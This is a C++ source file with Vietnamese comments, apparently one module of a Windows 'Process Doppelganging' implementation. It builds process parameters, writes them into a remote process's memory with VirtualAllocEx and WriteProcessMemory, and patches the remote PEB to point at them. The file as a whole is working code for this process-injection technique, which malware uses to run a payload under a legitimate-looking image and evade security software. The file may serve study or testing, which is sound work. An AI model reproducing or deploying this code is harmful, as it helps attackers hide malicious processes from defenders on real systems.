#include "proc_context.h"

#include "win_kernel_defs.h"
#include "win_api_ext.h"
#include "file_helper.h"

#include <iostream>
#include <userenv.h>
#pragma comment(lib, "Userenv.lib")

// Cập nhật con trỏ tham số trong cấu trúc PEB
bool update_params_in_peb(PVOID params_base, HANDLE process_handle, PROCESS_BASIC_INFORMATION &process_info)
{
    // Truy cập PEB từ xa
    ULONGLONG remote_peb_addr = (ULONGLONG)process_info.PebBaseAddress;
    if (!remote_peb_addr)
    {
        std::cerr << "Failed to get remote PEB address!" << std::endl;
        return false;
    }

    // Tính toán offset của trường ProcessParameters trong cấu trúc PEB
    PEB peb_copy = {0};
    ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;

    // Tính địa chỉ tham số trong bộ nhớ từ xa
    LPVOID remote_param_addr = (LPVOID)(remote_peb_addr + offset);

    // Cập nhật địa chỉ tham số vào PEB
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(process_handle, remote_param_addr,
                            &params_base, sizeof(PVOID),
                            &bytes_written))
    {
        std::cout << "Cannot update Process Parameters!" << std::endl;
        return false;
    }
    return true;
}

// Đọc thông tin PEB từ tiến trình từ xa
bool read_remote_peb(HANDLE process_handle, PROCESS_BASIC_INFORMATION &process_info, OUT PEB &peb_data)
{
    memset(&peb_data, 0, sizeof(PEB));
    PPEB remote_peb_addr = process_info.PebBaseAddress;
#ifdef _DEBUG
    std::cout << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
#endif
    // Đọc dữ liệu PEB từ tiến trình từ xa vào bộ nhớ cục bộ
    NTSTATUS status = NtReadVirtualMemory(process_handle, remote_peb_addr, &peb_data, sizeof(PEB), NULL);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "Cannot read remote PEB: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

// Ghi tham số vào bộ nhớ của tiến trình từ xa
LPVOID write_parameters_to_process(HANDLE process_handle, PRTL_USER_PROCESS_PARAMETERS params, DWORD protection)
{
    if (params == NULL)
        return NULL;

    // Xác định vùng bộ nhớ cần sao chép
    PVOID buffer = params;
    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

    // Kiểm tra xem môi trường có nằm trong cùng vùng bộ nhớ không
    if (params->Environment)
    {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment)
        {
            buffer = (PVOID)params->Environment;
        }
        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
        if (env_end > buffer_end)
        {
            buffer_end = env_end;
        }
    }

    // Sao chép vùng liên tục chứa cả tham số và môi trường
    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
    if (VirtualAllocEx(process_handle, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
    {
        // Ghi dữ liệu tham số
        if (!WriteProcessMemory(process_handle, (LPVOID)params, (LPVOID)params, params->Length, NULL))
        {
            std::cerr << "Writing ProcessParameters failed" << std::endl;
            return nullptr;
        }
        // Ghi dữ liệu môi trường nếu có
        if (params->Environment)
        {
            if (!WriteProcessMemory(process_handle, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL))
            {
                std::cerr << "Writing environment data failed" << std::endl;
                return nullptr;
            }
        }
        return (LPVOID)params;
    }

    // Nếu không thể cấp phát và sao chép liên tục, thử cấp phát và sao chép từng phần riêng biệt
    // Cấp phát và sao chép phần tham số
    if (!VirtualAllocEx(process_handle, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
    {
        std::cerr << "Allocating ProcessParameters memory failed" << std::endl;
        return nullptr;
    }
    if (!WriteProcessMemory(process_handle, (LPVOID)params, (LPVOID)params, params->Length, NULL))
    {
        std::cerr << "Writing ProcessParameters failed" << std::endl;
        return nullptr;
    }

    // Cấp phát và sao chép phần môi trường nếu có
    if (params->Environment)
    {
        if (!VirtualAllocEx(process_handle, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
        {
            std::cerr << "Allocating environment memory failed" << std::endl;
            return nullptr;
        }
        if (!WriteProcessMemory(process_handle, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL))
        {
            std::cerr << "Writing environment data failed" << std::endl;
            return nullptr;
        }
    }
    return (LPVOID)params;
}

// Thiết lập tham số tiến trình
bool configure_process_parameters(HANDLE process_handle, PROCESS_BASIC_INFORMATION &process_info, LPWSTR target_path)
{
    // Chuẩn bị đường dẫn ứng dụng
    UNICODE_STRING target_path_str = {0};
    RtlInitUnicodeString(&target_path_str, target_path);

    // Chuẩn bị thư mục hiện tại
    wchar_t dir_path[MAX_PATH] = {0};
    extract_directory(target_path, dir_path, MAX_PATH);
    // Nếu thư mục trống, đặt thư mục hiện tại
    if (wcsnlen(dir_path, MAX_PATH) == 0)
    {
        GetCurrentDirectoryW(MAX_PATH, dir_path);
    }
    UNICODE_STRING current_dir_str = {0};
    RtlInitUnicodeString(&current_dir_str, dir_path);

    // Thiết lập thư mục DLL
    wchar_t dll_dir[] = L"C:\\Windows\\System32";
    UNICODE_STRING dll_dir_str = {0};
    RtlInitUnicodeString(&dll_dir_str, dll_dir);

    // Thiết lập tiêu đề cửa sổ
    UNICODE_STRING window_title_str = {0};
    wchar_t *window_title = L"Process Doppelganging Test";
    RtlInitUnicodeString(&window_title_str, window_title);

    // Tạo khối môi trường
    LPVOID environment;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    // Tạo tham số tiến trình
    PRTL_USER_PROCESS_PARAMETERS params = nullptr;
    NTSTATUS status = RtlCreateProcessParametersEx(
        &params,
        (PUNICODE_STRING)&target_path_str,
        (PUNICODE_STRING)&dll_dir_str,
        (PUNICODE_STRING)&current_dir_str,
        (PUNICODE_STRING)&target_path_str,
        environment,
        (PUNICODE_STRING)&window_title_str,
        nullptr,
        nullptr,
        nullptr,
        RTL_USER_PROC_PARAMS_NORMALIZED);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "RtlCreateProcessParametersEx failed" << std::endl;
        return false;
    }

    // Sao chép tham số vào tiến trình từ xa
    LPVOID remote_params = write_parameters_to_process(process_handle, params, PAGE_READWRITE);
    if (!remote_params)
    {
        std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
        return false;
    }
#ifdef _DEBUG
    std::cout << "[+] Parameters mapped!" << std::endl;
#endif

    // Đọc và cập nhật PEB
    PEB peb_copy = {0};
    if (!read_remote_peb(process_handle, process_info, peb_copy))
    {
        return false;
    }

    // Cập nhật tham số trong PEB
    if (!update_params_in_peb(remote_params, process_handle, process_info))
    {
        std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
        return false;
    }

#ifdef _DEBUG
    // Kiểm tra lại sau khi cập nhật
    if (!read_remote_peb(process_handle, process_info, peb_copy))
    {
        return false;
    }
    std::cout << "> ProcessParameters address: " << peb_copy.ProcessParameters << std::endl;
#endif
    return true;
}